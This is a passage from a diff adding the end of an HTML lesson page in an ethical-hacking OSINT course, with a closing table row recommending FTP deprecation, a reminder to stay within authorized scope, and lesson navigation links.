+            </tr>
+            <tr>
+              <td><strong>The Protocol Is Outdated — Plan for Deprecation</strong></td>
+              <td>FTP lacks encryption and modern security features; SFTP/FTPS are secure alternatives.</td>
+              <td>Decommissioning FTP eliminates an entire class of risk and simplifies monitoring.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- REDOPS REMINDER                                               -->
+    <!-- ============================================================ -->
+
+    <div class="info-remember" style="margin: 15px 0;">
+      <em>RedOps Reminder:</em> FTP catalogs mirror mistakes — find them, document them, and never cross the authorization line. 
+	  The difference between OSINT and intrusion is permission; keep your queries auditable, your findings ethical, and your 
+	  engagement scope clear.
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- FLOATING NAVIGATION                                           -->
+    <!-- ============================================================ -->
+
+    <div class="lesson-nav-container">
+      <a href="https://iscsecurity.org/content/1-ethical-hacking/2-open-source-intelligence/10-google-additional-tips" class="nav-link-btn">👈 Back</a>
+      <a href="https://iscsecurity.org/content/1-ethical-hacking/2-open-source-intelligence/12-google-dorking-cheat-sheet" class="nav-link-btn">Next 👉</a>
+    </div>
+
+    </article>
+  </main>
+
+  <!-- Shared redirect script -->
+  <script src="/js/ms-redirect.js"></script>
+
+</body>
+</html>
